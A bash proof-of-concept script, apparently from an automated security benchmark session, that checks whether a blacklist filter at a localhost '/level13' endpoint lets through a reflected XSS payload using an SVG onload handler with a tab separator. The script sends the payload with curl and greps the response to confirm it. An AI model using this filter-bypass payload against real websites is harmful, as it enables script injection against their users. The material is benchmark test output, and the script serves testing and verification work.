#!/bin/bash
# POC: Verifies SVG onload XSS bypass vulnerability at /level13 endpoint
# Target: ./repo
# Created: 2025-11-04T17:05:38.235Z
# Session: benchmark-XBEN-016-24-mhkt6d0m

# XSS Bypass via SVG onload Event Handler - /level13 endpoint verification
# This POC verifies that the blacklist filter at /level13 does not block SVG onload handlers

TARGET_URL="http://localhost:5000/level13"
PAYLOAD="%3E%3Csvg%09onload=alert%28%22XSS%22%29%3E"

echo "[*] XSS SVG onload Bypass - Verification POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Check if endpoint exists and responds
echo "[Test 1] Checking if endpoint responds..."
HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL?name=$PAYLOAD")
if [ "$HTTP_STATUS" = "200" ]; then
    echo "[+] Endpoint responds with HTTP 200"
else
    echo "[-] Endpoint returned HTTP $HTTP_STATUS"
    exit 1
fi

# Test 2: Check if payload is reflected without filtering
echo ""
echo "[Test 2] Checking if SVG payload is reflected..."
RESPONSE=$(curl -s "$TARGET_URL?name=$PAYLOAD")

# Check for SVG element
if echo "$RESPONSE" | grep -q "<svg"; then
    echo "[+] SVG tag is reflected in response (not filtered)"
else
    echo "[-] SVG tag was filtered"
    exit 1
fi

# Check for onload handler
if echo "$RESPONSE" | grep -q "onload"; then
    echo "[+] onload handler is reflected in response (not filtered)"
else
    echo "[-] onload handler was filtered"
    exit 1
fi

# Test 3: Verify the complete payload structure
echo ""
echo "[Test 3] Verifying complete payload structure..."
if echo "$RESPONSE" | grep -E "<svg[[:space:]]+onload=" > /dev/null; then
    echo "[+] SVG with onload event handler detected - XSS VULNERABILITY CONFIRMED"
    PAYLOAD_LINE=$(echo "$RESPONSE" | grep -o "<svg[^>]*onload[^>]*>")
    echo "[+] Payload in response: $PAYLOAD_LINE"
elif echo "$RESPONSE" | grep -E "svg.*onload" > /dev/null; then
    echo "[+] SVG onload combination found in response"
    PAYLOAD_LINE=$(echo "$RESPONSE" | grep -o "svg[[:space:]]*onload[^>]*")
    echo "[+] Fragment: $PAYLOAD_LINE"
fi

echo ""
echo "[+] XSS VULNERABILITY CONFIRMED - SVG onload bypass is effective"
exit 0